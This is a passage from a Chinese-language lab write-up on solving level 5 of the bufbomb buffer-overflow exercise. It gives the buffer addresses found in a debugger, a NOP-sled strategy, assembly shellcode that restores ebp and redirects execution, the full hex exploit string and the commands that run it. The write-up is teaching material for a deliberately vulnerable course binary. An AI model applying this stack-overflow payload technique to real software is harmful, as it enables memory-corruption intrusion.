                "args": ["-n","-u", "631907060609","<","${workspaceRoot}/level5(kaboom)/kaboom-row.txt"],
                "cwd": "${fileDirname}",
                "MIMode": "gdb", 
             }
    ```
       随便在`kaboom.txt`里写点东西，转成`kaboom-row.txt`后进入调试
 3. 可以得到五次getbufn的缓冲区首地址分别为`0x55682ca1` `0x55682c41` `0x55682ce1` `0x55682c51`  `0x55682c51`。因为每次都是用的同一个`kaboom.txt`文件，而缓冲区的首地址又不一样，所以需要使用nop指令(0x90)使得每次都能执行攻击代码。这里使用`0x55682da1`作为覆盖的入口地址。
    
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/1aff159ef42049da9103da61b6be25fd.png)
    
    > 覆盖test的入口地址要大于或等于这五个地址的最大的地址（`0x55682ce1`），并且小于真正执行攻击代码的起始地址
 4. 因为需要使test过程正常执行，所以攻击代码在boom的基础上，还需要动态的复原test过程的ebp（因为每次test的ebp都不一样）。
   
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/ee4b86e620c241e9bf360b6fac76c102.png)
    
    `attack.S`:
    
    ```c 
    lea 0x28(%esp),%ebp
    mov $0x3b1a3827,%eax
    push $0x80495fe
    ret
    ```
 5. 将反汇编的攻击代码写入缓冲区中
	
	`kaboom.txt`:
	```c
	/*  735个字节对应0x2df的空间大小  */
	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24 28 b8 27 38 1a 3b 68 fe 95 04 08 c3
	/* 覆盖testn的ebp */
	00 00 00 00
	/* 覆盖testn返回地址(buf入口) */
	a1 2d 68 55
	```
 6. 最后执行命令: 
	
	```c
	./hex2raw -n < "./level5(kaboom)/kaboom.txt" > "./level5(kaboom)/kaboom-row.txt";
	./bufbomb -n -u 631907060609 < "./level5(kaboom)/kaboom-row.txt";
	```
   
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/bbe402b54f2a414facafec9ef1615270.png)
    成功过关！

